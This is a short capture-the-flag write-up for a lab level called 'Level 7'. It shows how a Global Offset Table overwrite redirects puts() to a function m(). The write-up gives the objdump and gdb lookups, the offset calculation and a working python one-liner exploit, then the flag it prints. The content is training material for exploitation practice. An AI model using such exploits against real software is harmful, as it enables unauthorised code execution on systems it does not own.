# Level 7
*password : f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d*

## Analyze

```
$ scp -P 4242 level7@192.168.56.108:level7 binary/
```

## GOT overwrite

objective : excute `m()` instead of `puts()`

```
$ objdump -R ./level7 
...
08049928 R_386_JUMP_SLOT   puts
...
$ gdb level7
(gdb) info funct m
...
0x080484f4  m
...
```

`m()` address : 0x080484f4\
`puts()` address : 0x08049928

- compute offset : 8 + 3 * 4 = 20

```
$ ./level7  $(python -c 'print "a" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1651857543
```
